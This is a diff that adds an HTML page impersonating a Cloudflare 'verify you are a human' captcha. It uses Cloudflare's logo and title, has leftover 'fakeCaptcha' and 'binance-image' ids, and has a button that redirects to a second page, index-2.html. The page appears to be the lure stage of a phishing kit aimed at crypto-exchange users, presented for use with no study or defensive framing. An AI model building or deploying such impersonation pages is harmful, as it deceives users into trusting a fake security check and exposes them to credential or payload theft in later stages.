@@ -1,0 +1,124 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="shortcut icon" href="favicon-1.png">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #1D1F20;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: white;
+        }
+
+        #fakeCaptcha {
+            justify-content: center;
+            text-align: center
+        }
+
+        #fakeCaptcha p {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
+            font-size: 3.3vh;
+            letter-spacing: 1px;
+        }
+
+        #captchaButton {
+            box-sizing: border-box;
+            margin: 20px 0px;
+            min-width: 0;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            cursor: pointer;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            display: -webkit-inline-box;
+            display: -webkit-inline-flex;
+            display: -ms-inline-flexbox;
+            display: inline-flex;
+            -webkit-align-items: center;
+            -webkit-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-box-pack: center;
+            -webkit-justify-content: center;
+            -ms-flex-pack: center;
+            justify-content: center;
+            box-sizing: border-box;
+            font-size: 1.7vh;
+            font-family: inherit;
+            text-align: center;
+            -webkit-text-decoration: none;
+            text-decoration: none;
+            outline: none;
+            line-height: 24px;
+            word-break: keep-all;
+            color: #FFF;
+            border-radius: 4px;
+            min-height: 24px;
+            border: none;
+            background-image: none;
+            background-color: #F3811A;
+            border-radius: 10px;
+            padding: 6px 18px;
+            font-family: Arial;
+            font-weight: bold;
+        }
+
+        #captchaButton:hover {
+            opacity: 0.9;
+        }
+
+        #binance-image {
+            position: absolute;
+            top: 1vh;
+            width: 40vw;
+            max-width: 220px;
+        }
+
+        @media screen and (max-width: 767px) {
+            #binance-image {
+                width: 60vw;
+            }
+        }   
+    </style>
+
+<script>
+function myFunction() {
+window.location.href = "index-2.html";
+}
+</script>
+</head>
+<body>
+            <img id="binance-image">
+        <div id="fakeCaptcha">
+            <p>Please verify you are a human</p>
+            
+                <button type="submit" id="captchaButton" onclick="myFunction()">CLICK ME</button>
+                <input type="hidden" name="captcha" value="">
+            
+        </div>
+    </body>
+<script>
+    document.title = "Cloudflare" + " | Captcha";
+    let imageUrl = 'https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.png';
+    const imgEl = document.getElementById('binance-image');
+    imgEl.src = imageUrl;
+</script>
+</html>
